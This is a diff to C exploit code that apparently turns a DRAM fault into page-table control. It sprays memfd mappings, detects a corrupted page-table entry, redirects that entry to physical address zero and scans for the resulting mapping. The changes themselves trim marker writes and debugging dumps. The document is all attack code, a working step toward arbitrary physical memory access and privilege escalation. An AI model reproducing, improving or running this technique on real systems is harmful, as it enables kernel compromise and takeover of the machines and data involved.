@@ -34,7 +34,7 @@ uint64_t *find_glitched_pte(void)
 				uint64_t *ptr = (uint64_t*)(SPRAY_BASE + i * MEMFD_SIZE + j);
 				if (*ptr != 0x4141414141414141) {
 					printf("\nFAULT!\n");
-					hexdump(ptr, 4096);
+					//hexdump(ptr, 4096);
 
 					// now we need to inspect the page to see if it looks like one of our pagetables
 
@@ -79,9 +79,6 @@ int main()
 	for (size_t i=0; i < MEMFD_SIZE; i += TWO_MB) {
 		assert(lseek(memfd, i, SEEK_SET) >= 0);
 		assert(write(memfd, "AAAAAAAABBBBBBBB", 16) == 16);
-
-		assert(lseek(memfd, i + 0x100000, SEEK_SET) >= 0);
-		assert(write(memfd, "CCCCCCCC", 8) == 8);
 	}
 
 
@@ -90,7 +87,6 @@ int main()
 		uint8_t *map_vaddr = (uint8_t*)SPRAY_BASE + i * MEMFD_SIZE;
 		uint8_t *mmap_res = mmap(map_vaddr, MEMFD_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED_NOREPLACE, memfd, 0);
 		assert(mmap_res == map_vaddr);
-		*map_vaddr = 0x41;
 	}
 
 	/* on success, glitched_pte was glitched during a DRAM read.
@@ -105,7 +101,6 @@ int main()
 	printf("[*] Searching for corresponding mapping...\n");
 
 	*glitched_pte = *glitched_pte & 0x8000000000000fff; // point it at address zero (arbitrary)
-	*(glitched_pte+256) = *glitched_pte;
 
 	uint64_t foo = 0;
 
@@ -113,14 +108,12 @@ int main()
 	for (int k=0; k<2; k++) {
 		for (size_t i = 0; i < PT_SPRAY_COUNT; i++) {
 			for (size_t j = 0; j < MEMFD_SIZE; j += TWO_MB) {
-				uint64_t *ptr = (uint64_t*)(SPRAY_BASE + i * MEMFD_SIZE + 0x100000 + j);
+				uint64_t *ptr = (uint64_t*)(SPRAY_BASE + i * MEMFD_SIZE + j);
 				foo += *glitched_pte; // read to keep it in cache
 				if (ptr == glitched_pte) continue;
-				if (*ptr != 0x4343434343434343) {
+				if (*ptr != 0x4141414141414141) {
 					printf("FAULT!\n");
 					printf("0x%016lx\n", ptr);
-
-					hexdump(ptr, 4096);
 				}
 			}
 		}
